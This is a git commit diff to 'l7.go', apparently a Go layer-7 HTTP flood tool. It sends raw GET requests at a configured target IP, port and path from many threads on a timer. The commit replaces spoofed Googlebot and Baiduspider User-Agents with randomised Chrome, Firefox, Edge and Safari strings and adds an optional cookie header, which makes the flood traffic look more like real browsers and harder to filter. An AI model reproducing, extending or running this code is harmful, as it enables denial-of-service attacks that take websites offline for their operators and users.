c6329820caae76be64d056d365035c8bf93a6bcf
JDPST224 <146357456+JDPST224@users.noreply.github.com>
2024-11-30 20:28:09 +0800

    Update l7.go

--- l7.go
+++ l7.go
@@ -13,40 +13,27 @@ import (
 )
 
 var (
-	ip      string
-	port    int
-	path    string
-	threads int
-	timer   int
+	ip       string
+	port     int
+	path     string
+	threads  int
+	timer    int
+	cookie   string
+	basePath string
 
 	choice  = []string{"Macintosh", "Windows", "X11"}
 	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
 	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
 	choice4 = []string{"Linux i686", "Linux x86_64"}
-	choice5 = []string{"chrome", "spider", "ie"}
+	choice5 = []string{"chrome", "firefox", "edge", "safari"}
 	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
-	spider  = []string{
-		"AdsBot-Google ( http://www.google.com/adsbot.html)",
-		"Baiduspider ( http://www.baidu.com/search/spider.htm)",
-		"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
-		"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
-		"Googlebot-Image/1.0",
-		"Googlebot-News",
-		"Googlebot-Video/1.0",
-	}
-	acceptHeaders = []string{
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-		"Accept-Encoding: gzip, deflate",
-		"Accept-Language: en-US,en;q=0.5",
-		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
-	}
 )
 
 func init() {
 	rand.Seed(time.Now().UnixNano())
 }
 
-func getuseragent() string {
+func getUserAgent() string {
 	platform := choice[rand.Intn(len(choice))]
 	var os string
 	if platform == "Macintosh" {
@@ -61,23 +48,28 @@ func getuseragent() string {
 		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
 		version := fmt.Sprintf("%d.0.%d.%d", rand.Intn(99), rand.Intn(9999), rand.Intn(999))
 		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s.0 (KHTML, like Gecko) Chrome/%s Safari/%s", os, webkit, version, webkit)
-	} else if browser == "ie" {
+	} else if browser == "firefox" {
 		version := fmt.Sprintf("%d.0", rand.Intn(99))
-		engine := fmt.Sprintf("%d.0", rand.Intn(99))
-		token := ""
-		if rand.Intn(2) == 1 {
-			token = choice6[rand.Intn(len(choice6))] + "; "
-		}
-		return fmt.Sprintf("Mozilla/5.0 (compatible; MSIE %s; %s; %sTrident/%s)", version, os, token, engine)
+		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/20100101 Firefox/%s", os, version, version)
+	} else if browser == "edge" {
+		version := fmt.Sprintf("%d.0.%d.%d", rand.Intn(99), rand.Intn(9999), rand.Intn(999))
+		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edge/%s", os, version, version)
+	} else {
+		version := fmt.Sprintf("%d.0", rand.Intn(99))
+		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Version/%s Safari/537.36", os, version)
 	}
-	return spider[rand.Intn(len(spider))]
 }
 
 func getHeader() string {
 	header := fmt.Sprintf("GET %s HTTP/1.1\r\n", path)
 	header += fmt.Sprintf("Host: %s\r\n", ip)
-	header += fmt.Sprintf("User-Agent: %s\r\n", getuseragent())
-	header += fmt.Sprintf("%s\r\n", acceptHeaders[rand.Intn(len(acceptHeaders))])
+	header += fmt.Sprintf("User-Agent: %s\r\n", getUserAgent())
+	header += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+	header += "Accept-Encoding: gzip, deflate\r\n"
+	header += "Accept-Language: en-US,en;q=0.5\r\n"
+	if cookie != "" {
+		header += fmt.Sprintf("Cookie: %s\r\n", cookie)
+	}
 	header += "Connection: keep-alive\r\n\r\n"
 	return header
 }
@@ -163,7 +155,7 @@ func main() {
 		for t := 0; t < timer; t++ {
 			<-ticker.C
 			for i := 0; i < threads; i++ {
-				requestCount <- 200 // Adjust per thread load here
+				requestCount <- 200
 			}
 		}
 		close(requestCount)
